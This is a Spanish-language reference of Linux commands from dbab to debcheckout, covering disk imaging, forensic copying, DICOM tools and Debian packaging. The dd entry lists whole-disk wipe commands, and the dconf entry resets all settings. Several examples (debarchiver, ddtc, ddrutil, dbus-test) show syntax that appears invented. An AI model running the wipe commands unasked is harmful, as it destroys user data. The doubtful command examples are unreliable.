[Don't Be A Bitch - No seas perro]. Bloqueo de anuncios basado en dnsmasq. Bloquea sitios de publicidad a nivel de DNS. La lista de bloqueos de anuncios se puede descargar periódicamente desde pgl.yoyo.org y se puede ajustar localmente. Acelera la navegación en dispositivos móviles sin instalar ninguna aplicación en ellos. Incluye las herramientas dbab-add-list, dbab-chk-list [esta lista puede ayudar a comprobar si la propia lista ya está cubierta por pgl.yoyo.org], dbab-get-list, dbab-svr y dhcp-add-wpad.
$ dbab-add-list (gregar tu propia lista de bloqueo de anuncios)
$ dbab-get-list (obtener/actualizar lista de bloqueo de anuncios)
# ln -s /usr/sbin/dbab-get-list /etc/cron.weekly/ (Para actualizar semanalmente con cron)
# nano /etc/dbab/dbab.list- (para quitar de la lista algun host que nos ha bloqueado)
# nano /etc/dbab/dbab.list+ (para incluir alguno)


dbar
Barra de progreso/medidor de porcentaje gráfico ASCII de propósito general. dbar le permite definir marcas estáticas de 0% y 100% o puede definir estas marcas dinámicamente en tiempo de ejecución. Las marcas estáticas y dinámicas se pueden mezclar, en este caso el valor especificado en tiempo de ejecución tendrá una prioridad más alta. Puede especificar rangos de números, negativos, positivos o rangos con un valor mínimo negativo y un valor máximo positivo.
$ seq 100 | dbar -s x -l linux (usando "x" y con el texto "linux" al principio)


dbconfig-common
Sistema utilizado en Debian y sus derivados para facilitar la configuración de bases de datos para aplicaciones que la requieren durante su instalación. Este sistema permite que varios paquetes de software compartan la misma infraestructura de configuración de base de datos. Cuando se instala un paquete que utiliza dbconfig-common, este se encargará automaticamente de gestionar la creación y configuración de la base de datos necesaria como MySQL, PostgreSQL, etc. así como de almacenar las credenciales necesarias para que la aplicación pueda acceder a la base de datos.
1.-
Ejemplo: Instalación del paquete phpmyadmin que utiliza dbconfig-common y que requiere una base de datos MySQL. Durante la instalación, el sistema pedirá configurar la base de datos.
# apt install phpmyadmin
dbconfig-common se encargará de configurar automáticamente la base de datos según las respuestas.
2.-
Configuración manual con el comando:
# dpkg-reconfigure dbconfig-common
Abrirá un asistente para configurar los detalles de la base de datos.


dbconfig-no-thanks
Paquete que se puede instalar si no se desea que dbconfig-common [ver] configure automáticamente la base de datos para un paquete específico permitiéndo hacerlo manualmente o utilizar otro método de configuración.
1.-
Ejemplo: Instalación del paquete phpmyadmin sin que dbconfig-common configure la base de datos automáticamente:
# apt install dbconfig-no-thanks
# apt install phpmyadmin
Cuando se instale phpmyadmin, no se activará la configuración automática de la base de datos, y se tendrá que configurarla manualmente.


dbeacon
Programa de monitoreo de redes que se utiliza principalmente para supervisar la accesibilidad de otros dispositivos en una red y recopilar estadísticas sobre su funcionamiento, pérdida de paquetes, retraso en la transmisión y fluctuaciones en la conexión. Es multidifusión o sea que admite múltiples fuentes de difusión, lo que permite una mayor flexibilidad en la configuración. Es capaz de operar tanto con protocolos IPv4 como IPv6.
$ dbeacon (iniciará dbeacon en modo normal, donde comenzará a escuchar por defecto en el puerto 11111)
$ dbeacon -i 5 (establecerá un intervalo de 5 segundos entre los updates)
$ dbeacon -p 12345 (escuchar en el puerto 12345)
$ dbeacon -6 (activa el soporte para IPv6)


dbench
Simula cargas de trabajo para el sistema de archivos local. Es útil para probar el rendimiento de sistemas de archivos y almacenamiento.
$ dbench 4 (simula 4 clientes que acceden simultáneamente al sistema de archivos)
$ dbench 8 > resultados_dbench.log (simula 8 clientes y guarda los resultados en el archivo resultados_dbench.log)
$ dbench -t 60 16 (simula 16 clientes durante 60 segundos)
$ dbench -c custom.config 8 (utiliza el archivo de configuración custom.config para definir el comportamiento de la prueba y simula 8 clientes)


dbf2mysql
Este programa toma un archivo xBase [DBF] y envía consultas a un servidor MySQL para insertarlo en una tabla MySQL y viceversa, volcar una tabla MySQL a un archivo dbf para lo cual se usa la aplicación incluida en el paquete llamada mysql2dbf.
$ dbf2mysql -u usuario -p contraseña -d mi_base_de_datos -t clientes clientes.dbf (Un archivo "clientes.dbf" que  se quiere importar a una tabla llamada "clientes" en una base de datos MySQL llamada "mi_base_de_datos")


dblatex
Herramienta que convierte documentos DocBook SGML/XML en formatos de salida como DVI, PostScript y PDF.
$ dblatex -f pd mi_documento.xml (generar PDF desde un archivo XML)
$ dblatex -f dvi -o documento.dvi mi_documento.sgml (generar DVI con nombre documento.dvi desde un archivo SGML)
$ dblatex -f ps mi_documento.xml (generar PostScript desde un archivo XML)
$ dblatex -f pd,dvi,ps mi_documento.xml (generar múltiples formatos simultáneamente)
$ dblatex -f pd,dvi,ps -o salida_ mi_documento.xml --doctype book --language es_ES --with-figures --with-tables (generará PDF, DVI y PostScript del documento `mi_documento.xml`, usando el lenguaje español, incluyendo figuras y tablas en la salida)


dbmmanage
Se utiliza para crear y actualizar los archivos de formato DBM utilizados para almacenar los nombres de usuario y la contraseña para la autenticación básica de los usuarios HTTP a través de mod_authn_dbm. Los recursos disponibles en el servidor Apache HTTP pueden ser restringidos sólo a los usuarios listados en los archivos creados por dbmmanage. Este programa sólo puede ser usado cuando los nombres de usuario están almacenados en un archivo DBM. Para usar una base de datos de archivo plano, ver htpasswd. Otra herramienta para mantener una base de datos de contraseñas DBM es htdbm.
# dbmmanage archivo view USER (archivo de formato DBM sin la extensión .db, .pag, o .dir del usuario especificado)
# dbmmanage archivo adduser USER (añadir un usuario a una base de datos "archivo")
# dbmmanage archivo delete USER (eliminar un usuario)


dbtoepub
Convertir documentos DocBook al formato .epub [Electronic PUBlication], un estándar abierto para libros y publicaciones digitales.
$ dbtoepub documento.xml (generará un archivo llamado documento.epub en el mismo directorio)
$ dbtoepub --output-dir=epub_output documento.xml (colocará el archivo documento.epub en el directorio epub_output)
$ dbtoepub --title="Mi libro" --author="Autor Ejemplo" --language="es" --date="2025-01-16" documento.xml (especificar metadatos como el título, autor, idioma o fecha)
Nota.- Para verificar el archivo generado
$ epubcheck documento.epub


dbus-test
Sistema de mensajería entre procesos que permite que las aplicaciones interactúen tre sí.
$ dbus-test --address unix:abstract=/tmp/dbus-test (Probar la conexión)
$ echo "Hola mundo" | dbus-send --session --dest=org.example.HelloWorld --type=method_call /HelloWorld org.example.HelloWorld.Hello string:"Hola" (enviar un mensaje)
$ dbus-monitor --session (escuchar por eventos)
$ dbus-test --system --session --dest=org.freedesktop.DBus --type=method_call /org/freedesktop/DBus org.freedesktop.DBus.ListNames (probar un servicio específico)


dbus-test-runner
Ejecutable para ejecutar un par de programas bajo una nueva sesión DBus. Esta herramienta hace pruebas unitarias de código de acceso a DBus en tiempo de ejecución.
$ dbus-test-runner (de todos los parámetros por defecto)


dbview
Herramienta para visualizar y manipular archivos de bases de datos en formato dBase III y IV, que son formatos de archivo de base de datos bastante antiguos. Además, sirve para convertir archivos .dbf a otros formatos.
$ dbview archivo.dbf > salida.txt (creará salida.txt que contendrá los datos del archivo .dbf en un formato de texto)
$ dbview -c archivo.dbf > salida.csv (conversión a CSV)


dc
calculadora. Los operadores se colocan antes que sus operandos.
$ echo "5 2 + p" | dc (Se introducen dos números [5 y 2] se indica la operación a realizar [+] y que muestre el resultado [p])
$ echo "4 6 + 2 * 4 / p" | dc
$ echo "40034291 23 % p " | dc (Da el resto de la división)


dc3dd
Versión parcheada de GNU dd con funciones forenses. dc3dd es una versión parcheada de GNU dd con funciones adicionales para la investigación forense informática.
# dc3dd if=/dev/sdX of=/path/destino.img hash=md5 log=logfile.txt (copiar el dispositivo "if" en la salida "of" calculando el hash MG5 y guardar un registro detallado en un archivo de log)
# dc3dd if=/dev/sdX of=/path/destino.img split=2G log=split_log.txt (divide la salida en partes de 2 GB cada una útil para almacenar grandes imágenes en varios discos o medios)
# dc3dd if=/dev/sdX pattern="password123" log=pattern_log.txt (pattern="password123": busca "password123" dentro de los datos del dispositivo y los resultados se registran en pattern_log.txt)
# dc3dd if=/dev/sdX of=/path/destino.img conv=noerror,sync log=error_log.txt (continúa el proceso incluso si encuentra errores de lectura y los guarda en el log)
# dc3dd if=/dev/sdX of=/path/destino.img hash=md5,sha256 log=hash_log.txt (calcula hashes MD5 y SHA-256 simultáneamente para mayor verificación)
# dc3dd if=/path/destino.img hash=md5,sha256 hashlog=verify_log.txt (guarda los valores hash para comparación futura)
# dc3dd if=/path/entrada.img of=/path/destino.img bs=512 log=forensic_log.txt (establece un tamaño de bloque de 512 bytes, tamaño estándar en discos duros)


dcache
Es un sistema de almacenamiento masivo distribuido que permite gestionar grandes volúmenes de datos a través de una arquitectura de red. El comando dcache es una colección de herramientas que permiten a los usuarios interactuar con un sistema dCache. Estas herramientas permiten realizar operaciones como cargar, descargar, listar o eliminar datos en el entorno.
$ dcache ls /path/to/dcache/directory (listará todos los archivos y directorios en la ubicación especificada dentro del sistema dCache)
$ dcache put /local/path/to/file.txt /path/to/dcache/directory/ (subir file.txt desde una ruta local al directorio especificado en dCache)
$ dcache get /path/to/dcache/directory/file.txt /local/path/to/save/ (descargará file.txt desde dCache a la ruta local indicada)
$ dcache rm /path/to/dcache/directory/file.txt (eliminará file.txt del sistema dCache)
$ dcache stat /path/to/dcache/directory/file.txt (obtener información detallada sobre el archivo, como su tamaño, fecha de modificación, etc)


dcarw
Utilidad que convierte el formato nativo [RAW] de varias cámaras digitales en imágenes netpbm portable pixmap (.ppm) o TIFF.
$ dcarw input.raw output.ppm (convierte el archivo input.raw a un archivo output.ppm)
$ dcarw input.raw output.tiff (convierte el archivo input.raw a un archivo output.tiff)
$ dcarw *.raw output_%03d.ppm (convierte todos los .raw en la carpeta actual y los guarda como archivos PPM con nombres numerados: output_001.ppm, output_002.ppm, etc.)
$ dcarw -s 800x600 input.raw output.ppm (convierte el archivo input.raw a un archivo output.ppm, ajustando el tamaño de la imagen a 800x600 píxeles)


dcfldd
Versión mejorada de dd para análisis forense y seguridad.
# dcfldd if=/dev/sdX of=/path/destino.img hash=md5 hashlog=hash_log.txt (copia un disco mientras genera un hash MD5 y lo guarda en un log)
# dcfldd if=/dev/sdX of=/path/destino.img hash=md5,sha256 hashlog=hashes_log.txt (generar múltiples hashes al mismo tiempo)
# dcfldd if=/dev/sdX of=destino.img split=1G (divide la salida en partes de 1 GB cada una, útil para manejar grandes volúmenes de datos)
# dcfldd if=/dev/sdX pattern="confidencial" log=pattern_log.txt (busca la palabra "confidencial" en el dispositivo y guarda los resultados en un log)
# dcfldd if=/dev/sdX of=/dev/null (probar o analizar la velocidad de lectura sin escribir datos)


dcmtk
Forma parte del DICOM Toolkit desarrollado por OFFIS y ofrece herramientas para trabajar con archivos de imágenes médicas en formato DICOM. Estas herramientas son útiles para tareas como visualizar, manipular, convertir, validar y transmitir archivos DICOM.
$ dcm2xml input.dcm output.xml (convierte el archivo DICOM input.dcm al formato XML y lo guarda en output.xml)
$ xml2dcm input.xml output.dcm (convierte input.xml en un archivo DICOM output.dcm)
$ dcmdump input.dcm (muestra los encabezados y el contenido del archivo DICOM input.dcm)
$ dcmj2pnm --write-jpeg input.dcm output.jpg (convierte el archivo DICOM input.dcm a una imagen JPEG output.jpg)
$ dcmj2pnm --write-dicom output.dcm input.jpg (convierte input.jpg a un archivo DICOM output.dcm)
$ storescu -aet MyAE -aec PACS_AE 192.168.1.100 104 input.dcm (envía input.dcm al servidor PACS dirección IP 192.168.1.100, puerto 104, con el nombre de aplicación local MyAE y el AE Title del servidor PACS_AE)
$ movescu -aet MyAE -aec PACS_AE -aem MyMoveAE 192.168.1.100 104 -k PatientID=12345 (solicita al servidor PACS todas las imágenes del paciente con ID 12345 y las almacena localmente usando el AE Title MyMoveAE)
$ findscu -aet MyAE -aec PACS_AE 192.168.1.100 104 -k PatientName=Smith (busca pacientes con el nombre Smith en el servidor PACS)
$ dcmqrscp -c dcmqrscp.cfg (inicia un servidor PACS utilizando el archivo de configuración dcmqrscp.cfg)
$ dcmodify -m "PatientName=John Doe" input.dcm (cambia el nombre del paciente en el archivo input.dcm a John Doe)
$ dcmconv --write-pixel-sequence input.dcm output.dcm (convierte el archivo input.dcm en output.dcm)
$ dcmdump -E input.dcm (imprime información detallada sobre el archivo DICOM y sus encabezados)
$ findscu -aec PACS_AE 192.168.1.100 104 -k StudyDescription (lista todas las descripciones de estudios disponibles en el servidor PACS)


dconf
Restablece los parámetros o configuración por defecto de entornos de escritorio Unity, GNOME y MATE.
$ dconf reset -f /


dcraw
Herramienta para procesar chivos RAW de cámaras digitales y convertirlos en formatos más comunes como PPM o TIFF.
$ dcraw -c arhivo.raw (extrae información básica del archivo RAW sin procesar la imagen)
$ dcraw -D archivo.raw > imagen.ppm (convierte el archivo RAW a formato PPM [Portable Pixmap])
$ dcraw -T archivo.raw > imagen.tiff (convierte el archivo RAW a formato TIFF)
$ dcraw -j archivo.raw > imagen.jpg (convierte el archivo RAW a formato JPEG)
$ dcraw -d x=100,y=100,w=200,h=300 archivo.raw > imagen.ppm (extrae una subimagen del tamaño 200x300 desde las coordenadas (100,100) del archivo RAW)
$ dcraw -c arhivo.raw | ppmtopnm | pnmquant 255 | pnmtopgm > imagen.pgm (extrae información básica del archivo RAW, convierte la imagen a PGM y aplica una cuantización de color)
$ dcraw -T archivo.raw > imagen.tiff && dcraw -D archivo.raw > imagen.ppm (convierte el archivo RAW a TIFF y PPM simultáneamente)


dctrl-tools
[Debian ConTRoL]. Herramientas para procesar y manipular archivos de control Debian, que contienen información sobre paquetes disponibles en el sistema. incluye las herramientas grep-aptavail, grep-available, grep-dctrl, grep-debtags, grep-status, join-dctrl, sort-dctrl, tbl-dctrl y sync-available.
$ grep-status -F Essential yes -s Package (ver listado de paquetes esenciales del sistema)
$ grep-status -F Status "install ok installed" (listar paquetes instalados)
$ grep-status -F Status "deinstall ok" (buscar paquetes con errores)
$ grep-status -F Status "half-installed" (ver paquetes en estado "half-installed")
$ grep-status -P -e 'apt|dpkg' (ver los registros de estado de todos los paquetes con "apt" o "dpkg" en sus nombres)
$ grep-dctrl -F Package python /var/lib/dpkg/status (buscar paquetes que contengan "python" en el nombre)
$ grep-dctrl -F Version 2.7.18 /var/lib/dpkg/status (buscar paquetes con una versión específica)
$ grep-dctrl -F Maintainer YOKOTA /var/lib/dpkg/status (buscar paquetes mantenidos por un desarrollador específico)
$ sort-dctrl -k Package /var/lib/dpkg/status (ordenar por nombre de paquete)
$ sort-dctrl -k Version /var/lib/dpkg/status (ordenar por versión de Debian)
$ sudo sync-available (sincronizar la base de datos de paquetes disponibles)
$ grep-available -F Description -i 7zip (buscar paquetes disponibles que contengan "7zip")
$ grep-available -F Tag -i interface::text-mode (buscar paquetes que tengan como tag "interface::text-mode")
$ grep-available -F Section -i web (buscar paquetes en una sección específica)
$ grep-available -F Architecture -i amd64 (buscar paquetes con una arquitectura específica)
$ grep-available -P -F Description 7zip (buscar en descripciones como en nombres; si se encuentra una coincidencia en alguno de ellos, se imprime el registro del paquete)
$ grep-available -F Maintainer -s Depends '<apo@debian.org>' (mostrar las líneas de dependencias de todos los paquetes del email del mantenedor especificado)
$ grep-aptavail -F Description -i "web browser" (buscar por descripción)
$ grep-dctrl -F Depends -s Package python3 /var/lib/apt/lists/*_Packages (busca en el campo Depends todos los paquetes que dependen de python3 en el archivo Packages)
$ grep-status -F Status -s Package "hold ok installed" /var/lib/dpkg/status (busca en el campo Status y muestra los paquetes encontrados que estan en estado hold del archivo status)
$ sort-dctrl -k Package /var/lib/apt/lists/*_Packages (ordena las entradas según el campo Package)
$ tbl-dctrl -s Package,Version,Architecture /var/lib/apt/lists/*_Packages (selecciona los campos que se desea mostrar en la tabla)


dd
Crea imagenes de discos, particiones ...
$ dd if=/dev/zero of=/dev/hda  (escribe ceros en todo el disco)
$ dd if=/dev/urandom of=/dev/hda  (llena el disco de números aleatorios)
$ dd if=/dev/hdx of=backup-mbr bs=512 count=1  (crea una copia de seguridad del mbr)
$ dd if=backup-mbr of=/dev/hda bs=512 count=1  (la restaura)
$ dd if=mbr of=/dev/hda (Restaurarla)
$ dd if=/dev/hda1 of=/dev/hda3 (copiar una partición)
$ dd if=/hda of=/hdb bs=1M (copiar un disco en bloques de 1 mega)
$ dd conv=noerror if=/dev/cdrom of=imagen_con_errores.img (Evitar que los errores impidan copiar datos. ütil en la recuperación de CDs o discos dañados)
$ dd if=/dev/sda of=/dev/sdb conv=noerror,sync (Realizar una copia exacta de una partición, evitando que los errores impidan copiarla)
$ time dd if=/dev/zero of=TEST bs=4k count=512000  (Realizar un test de velocidad del disco duro)
$ dd if=/dev/sda1 of=copia_seguridad.tar | pv  (copiar mostrando barra de progreso)
$ dd if=/dev/sdc bs=4096 dd of=/home/usuario/copia_seguridad | pv -s 2G (Lo mismo que el anterior)
$ dd if=/dev/hda of=/home/hda.iso (Crear una imagen iso de una partición)
$ dd if=/dev/hda | gzip > /home/hda.bin.gz (Crear una imagen comprimida)
$ dd bs=1M if=/dev/sda4 | ssh usuario@host 'dd of=/home/usuario/sda4.img' (crear una imagen de una partición local en un pc remoto)
$ dd if=/dev/cdrom of=~/cd_image.iso (Crear una ISO del cd)
# dd if=/dev/sda | pv | dd of=/dev/sdb bs=1M (Clonar partición viendo gráfico del proceso)


ddate
Convierte fechas gregorianas en fechas subrealistas. Algunas opciones coinciden con las de "date" (ver)
$ ddate (forma básica)
$ ddate +%d-%B-%Y
$ ddate +'Hoy es %{%A, el %e de %B%}, %Y. %N%nCelebrate %H'


ddcci-dkms
Este conjunto de módulos del núcleo proporciona un controlador DDC/CI [Display Data Channel Command Interface] para monitores compatibles y la integración en la clase de sistema de retroiluminación. Útil para controlar características de los monitores, como el brillo, el contraste y otros parámetros, directamente desde el sistema operativo.
$ lsmod | grep ddcci (Para verificar después de la instalación si los módulos del núcleo se han cargado automáticamente)
Una vez que ddcci-dkms está instalado y los módulos están cargados, se puede utilizar la herramienta ddcutil [apt install ddcutil] para interactuar con el monitor.
$ ddcutil detect (ver los monitores conectados y su información)
$ ddcutil getvcp 10 (leer propiedades específicas del monitor, como el brillo. 10 es el código VCP [Virtual Control Protocol] para el brillo)
$ ddcutil setvcp 10 50 (ajusta el brillo al 50%)
Nota.- Es importante mencionar que no todos los monitores son compatibles con DDC/CI. Si después de ejecutar los comandos no se obtiene resultados o el monitor no responde a los ajustes, puede que el monitor no soporte esta funcionalidad o que haya un problema de configuración.


ddccontrol
Herramienta que se utiliza para controlar los parámetros del monitor, como el brillo y el contraste.
# ddccontrol -p (sondear dispositivos i2c)
# ddccontrol -r 0x10 dev:/dev/i2c-4 (leer el valor del control 0x10 [brillo en monitores compatibles con VESA] para el dispositivo dev:/dev/i2c-4)


ddclient
Configurar pc con una ip fija. Requiere registro en dyndns.org. Durante la instalación preguntará los datos del registro pero si se prefiere puede editarse el archivo de configuración y colocarlos a mano
# gedit /etc/ddclient.conf
Completar los campos login y password con los datos correspondientes:
protocol=dyndns2
use=web, web=checkip.dyndns.com, web-skip='IP Address'
server=members.dyndns.org
login=Nombre_registrado_en_dyndns
password='contraseña_de_dyndns'
nombre_de_dominio.dyndns.com
# ddclient -daemon=0 -debug -verbose -noquiet (forzar la ejecución de ddclient)


ddcutil
Utilidad para consultar y cambiar la configuración del monitor.
# ddcutil detect (detectar la configuración)
# ddcutil detect --brief (informe resumido de cada pantalla detectada)
# ddcutil capabilities (caracteristicas del monitor)
# ddcutil environment (Probar el entorno de instalación de ddcutil)
# ddcutil probe (Explorar las capacidades y características de un solo monitor)


ddgr
Herramienta que permite buscar información directamente desde la terminal usando DuckDuckGo como motor de búsqueda.
$ ddgr imagen de gatos (mostrará enlaces con la información solicitada)
$ ddgr site:github.com Python tutorials (usar operadores de búsqueda avanzada)
$ ddgr news since 2023-01-01 emacs (limitar resultados por fecha)


ddir
Muestra árbol de directorios como tree [ver].
$ ddir -R -l -a ~/Documents (ver el contenido del directorio y subdirectorios [-R+, incluso con nombres largos [-l] y ocultos [-a])
$ ddir -R --type=f | grep '\.x$' (mostrar solo archivos ejecutables)
$ ddir -c /path/to/directory (contar archivos y directorios)
$ ddir -Rh /path/to/directory | sort -k5 -n -r | head -n 10 (ordenará los resultados por tamaño descendente y mostrará los 10 archivos más grandes)


ddpt
Se utiliza principalmente para copiar datos entre dispositivos de almacenamiento, especialmente cuando se trabaja con discos, particiones o archivos.
# ddpt if=/dev/sda3 of=/dev/sdb3 bs=4M status=progress (copiar de dispositivo de salida [if=] al de destino [of=] con un tamaño del bloque de lectura/escritura de 4 megabytes y mostrando progreso de la operación)
# ddpt if=/ruta/al/archivo.iso of=/dev/sdb bs=4M status=progress (copiar desde un archivo a un dispositivo)
# ddpt if=/dev/sda of=/ruta/nuevo_archivo.img bs=4M status=progress (copiar desde un dispositivo a un archivo)


ddrescue
[make gcc g++]. Recuperación de discos dañados. Proceso:
Descargar el paquete dd_rhelp (Comprobar si existe una versión posterior):
$ wget http://www.kalysto.org/pkg/dd_rhelp-0.1.2.tar.gz
$ cd dd_rhelp-0.1.2
# ./dd_rhelp /dev/sdbx sdbx.img
Creará sdbx.img en el directorio actual, que podrá montarse:
# mount -o loop sdbx.img /media/imagen
Comprobar posibles errores (para partición ext3):
# fsck -y sdbx.img
Restaurar la imagen:
# dd_rhelp sdbx.img /dev/sdax
Método de ejecutar ddrescue en dos pasadas, de forma que la primera sólo recupera los bloques que no contenga sectores defectuosos y el segundo se centre en recuperar el máximo de los defectuosos:
# ddrescue -v -n /dev/sda /dev/sdb sda.txt
# ddrescue -v -r2 -d /dev/sda /dev/sdb sda.txt
Luego comprobar errores con fsck.


dds2tar
Herramienta utilizada para trabajar con cintas DAT [Digital Audio Tape]. Permite identificar y manejar dispositivos SCSI desconocidos mediante el uso de cintas de datos compatibles con el formato DDS [Digital Data Storage]. También puede extraer información o interactuar con los datos almacenados en dichas cintas.
$ dds2tar -i /dev/st0 (descubrir un dispositivo SCSI desconocido y proporcionar detalles como modelo, fabricante y compatibilidad [/dev/st0 es el dispositivo de cinta típico en un sistema Linux])
$ dds2tar -l /dev/st0 (leer el contenido de una cinta y listar los archivos almacenados sin extraerlos)
$ dds2tar -x /dev/st0 (extraer los archivos almacenados en una cinta en el directorio actual)
$ tar cf - /ruta/a/datos | dds2tar -w /dev/st0 (crea un archivo tar desde /ruta/a/datos y lo envía y los escribe  en la cinta conectada en /dev/st0)
$ dds2tar -v /dev/st0 (verificación de los datos almacenados en la cinta)


ddrutility
Conjunto de herramientas que se utiliza para ayudar en la recuperación de datos relacionados con sectores defectuosos y está diseñado para complementar a gnuddrescue. Este conjunto de utilidades se centra en facilitar operaciones que pueden ser necesarias durante el proceso de recuperación de datos, como la creación de imágenes de disco, la verificación de integridad de datos...
$ ddrescue /dev/sdX /path/to/imagefile.img /path/to/logfile.log (intenta recuperar datos del dispositivo /dev/sdX y los escribe en imagefile.img, usando logfile.log para registrar el progreso)
$ ddrutil --create-image /dev/sdX /path/to/disk.img (creará una imagen del dispositivo /dev/sdX y la guardaría en disk.img)
$ ddrverify /path/to/imagefile.img (comprobará la integridad del archivo de imagen especificado)
$ ddrinfo /dev/sdX (mostrará información detallada sobre el dispositivo de almacenamiento especificado)


ddtc
[Debian Description Translation Coordinator - Coordinador de traducción de descripciones de Debian].Herramienta diseñada para ayudar a los traductores y revisores en la gestión de correos electrónicos relacionados con el sistema de traducción de descripciones de paquetes Debian [DDTS, Debian Description Translation System]. Automatiza tareas como analizar correos, separar traducciones por paquetes, enviar traducciones revisadas y corregir errores en las traducciones.
$ ddtc --analyze ddts-email.txt (generará varios archivos de traducción, uno para cada paquete mencionado en el correo)
$ ddtc --review paquete_es.po (Abrirá el archivo de traducción en español del paquete que se desea revisar para que se realicen ajustes)
$ ddtc --correct paquete_es.po (intentará corregir errores automáticamente, como formatos incorrectos o caracteres no válidos)
$ ddtc --send paquete_es.po (enviará la traducción al sistema y notificará que está lista para su integración)


ddupdate
Actualiza las direcciones IP dinámicas que normalmente se obtienen mediante DHCP con servicios DNS dinámicos como changeip.com, duckdns.org o no-ip.com entre otros. Crear el archivo:
# nano /etc/ddupdate.conf
Con el siguiente contenido:
	[update]
	address-plugin = default-if
	service-plugin = dry-run
	hostname = NOMBRE.duckdns.org
	ip-version = v4
	loglevel = warning
# ddupdate -H NOMRE.duckdns.org
# ddupdate -S (mostrar servicios de dns)


deallocvt
Libera memoria y estructuras de datos del núcleo para todas las consolas virtuales que no se usen. Una consola virtual se considera en desuso si no es la consola en primer plano, ni  ningún  proceso  la  tiene  abierta  para  lectura  o escritura, ni se ha seleccionado ningún texto en su pantalla. Ver openvt
# deallocvt (Las desasigna todas)
# deallocvt 5 (Sólo desasigna la /dev/tty5)
Un ejemplo de uso:
# openvt -s ls (lanzara el comando ls en la primera consola virtual libre. Normalmente la /dev/tty8)
# deallocvt 8


deb
Extensión de los paquetes para distros Debian.
1.-
Crear un paquete para esta distro a partir de un script:
	$ mkdir deb
En ese directorio recrear la estructura destino que queremos utilizar. En nuestro caso /usr/bin, el directorio para el icono y permisos:
	$ mkdir -p deb/usr/bin
	$ mkdir -p deb/usr/share/applications
Copiar el script en el bin creado:
	$ cp script deb/usr/bin
Crear el subdirectorio DEBIAN:
	$ mkdir deb/DEBIAN
En su interior el fichero “control”:
	$ nano deb/DEBIAN/control
En el que pegamos datos del paquete:
Package: nombre-que-queremos
Priority: optional
Section: misc
Maintainer: el_mantenedor
Architecture: all
Version: 1.0
Depends: Las_dependendias_del_paquete
Description: Pequeña_descripción_de_la_maravilla
 Este script .... para ..... de ..... aquello.......
Notas: En el nombre del paquete (Package) no se admiten espacios ni barras bajas) y en la descripción (Description) el primer carácter de la segunda linea es un espacio y al final del texto, darle al intro para que ponga una linea vacia. Las dependencias que pongamos en “Depends” son las que se instalarán  con la instalación del .deb.
Crear el paquete “menu” en el mismo directorio:
	$ nano deb/DEBIAN/menu
Y en su interior pegar:
    	?package(nombre_script):needs="X11" \
		section="Applications/Network/Monitoring" \
		title="Suport VNC" command="gnome-terminal -e script_que_sea" \
		icon="/usr/share/pixmaps/gnome-term-linux2.png"
Notas: Nombre del paquete, que precisa de las X (X11), donde se colocará en el menú “Aplicaciones” (otras opciones: section=”Apps/Multimedia”...), el comando que lo lanzará (gnome-terminal -e script) y el icono que hemos escogido. Crear el archivo nombre_script.desktop para los datos del icono:
	$ gedit deb/usr/share/applications/nombre_script.desktop
Y pegar el siguiente contenido:
	[Desktop Entry]
	Version=1.0
	Name=Nombre_script
	GenericName=Nombre_script
	Comment=Pequeño_comentario
	Exec=Nombre_script_que_lo_lanzará
	Terminal=true
	Type=Application
	Categories=Application;Network;
	Icon=gnome-term-linux2.png
	StartupNotify=true
Nota.- también varios modelos de iconos en:
	$ ls /home/usuario/.local/share/applications/
Cambiar el propietario del directorio:
	# chown -R root.root deb
Finalmente crear el paquete .deb y que lo coloque en el escritorio:
	# dpkg -b deb /home/usuario/Escritorio/nombre.deb
2.-
Crear un paquete a partir de un tar.gz:
Para el ejemplo usaremos el paquete picpuz, un juego para crear puzles a partir de una fotografia, que aunque tenga versión .deb, para el caso nos sirve.
Crear carpeta de trabajo y entrar en ella:
	$ mkdir picpuz
	$ cd picpuz
Descargar y descomprimir el tar.gz y entrar en la carpeta descomprimida:
$ wget http://kornelix.squarespace.com/storage/downloads/picpuz-2.2.tar.gz
$ tar xvzf picpuz-2.2.tar.gz
$ cd picpuz-2.2
Crear el nuevo paquete .orig.tar.gz con los estandares de Debian, con licencia gpl3 y generando el paquete desde las fuentes:
	$ dh_make --createorig  -c gpl3 -s
Construir el paquete .deb:
	$ dpkg-buildpackage -rfakeroot
Listar el contenido de un paquete .deb:
	$ ar -tv picpuz_2.2-1_i386.deb
Información y perspectiva general de lo que ofrece el paquete:
	$ dpkg-deb -I picpuz_2.2-1_i386.deb
Listar los ficheros que serán instalados:
	$ dpkg-deb -c picpuz_2.2-1_i386.deb
instalarlo:
	# dpkg -i picpuz_2.2-1_i386.deb
Lo encontraremos en aplicaciones/juegos


debarchiver
Herramienta diseñada específicamente para organizar y estructurar archivos de paquetes Debian de manera eficiente. Su propósito principal es crear una estructura de directorios que otras herramientas como apt-get y similares puedan utilizar fácilmente para instalar o actualizar paquetes.  Los archivos de paquetes ubicados en el directorio de entrada de debarchiver junto con el archivo ".changes" generado correspondiente serán ordenados por un cronjob en el directorio apropiado del repositorio.
$ debarchiver create-pkg /ruta/al/archivo.deb /ruta/destino/ (crea un nuevo paquete a partir de un archivo .deb existente y lo coloca en la estructura correcta)
$ debarchiver extract-pkg /ruta/paquete.deb /ruta/extraer/ (extrae todos los archivos contenidos en el paquete .deb a la ruta especificada)
$ debarchiver list-pkg /ruta/paquete.deb (muestra un resumen detallado de los archivos incluidos en el paquete)
$ debarchiver check-pkg /ruta/paquete.deb (verifica si el paquete está intacto y no ha sido modificado durante la transferencia)
$ debarchiver clean-pkg /ruta/paquete.deb (elimina archivos temporales y comprime el paquete para ahorrar espacio)


debcheckout
Recupera la información sobre el sistema de control de versiones utilizado para mantener un paquete Debian dado y luego verifica la última versión del paquete de su repositorio.
$ debcheckout nano
	declared git repository at https://anonscm.debian.org/git/collab-maint/nano.git
	git clone https://anonscm.debian.org/git/collab-maint/nano.git nano ...
	S'està clonant a 'nano'...
	remote: Counting objects: 3577, done.
	remote: Compressing objects: 100% (2271/2271), done.
	remote: Total 3577 (delta 2489), reused 2148 (delta 1163)
	S'estan rebent objectes: 100% (3577/3577), 7.46 MiB | 527.00 KiB/s, fet.
	S'estan resolent les deltes: 100% (2489/2489), fet.
	$ ls | grep nano
	nano
	$ ls nano/
	ABOUT-NLS            compile       COPYING       install-sh     nano.spec     syntax
	aclocal.m4           config.guess  COPYING.DOC   lib            nano.spec.in  THANKS
	ar-lib               config.h.in   debian        m4             NEWS          TODO
	AUTHORS              config.rpath  depcomp       Makefile.am    po
	ChangeLog            config.sub    doc           Makefile.in    README
	ChangeLog.1999-2006  configure     IMPROVEMENTS  missing        README.GIT
